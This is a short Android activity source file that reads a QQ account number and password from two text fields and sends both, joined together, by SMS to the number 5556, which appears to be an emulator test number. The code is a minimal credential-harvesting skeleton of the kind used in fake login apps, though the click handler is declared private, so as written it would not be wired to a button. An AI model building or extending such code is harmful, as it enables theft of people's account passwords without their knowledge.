package com.treaker.smssend;

import android.os.Bundle;
import android.app.Activity;
import android.telephony.SmsManager;
import android.view.Menu;
import android.view.View;
import android.widget.EditText;

public class MainActivity extends Activity {

    private EditText et_qq;
    private EditText et_pw;

	@Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);
        et_qq = (EditText) findViewById(R.id.et_qq);
        et_pw = (EditText) findViewById(R.id.et_pw);
    }
	private void sendsms (View view) {
		String qq = et_qq.getText().toString();
		String pw = et_pw.getText().toString();
		SmsManager.getDefault().sendTextMessage("5556", null, qq+"--"+pw, null, null);
	}

  
}
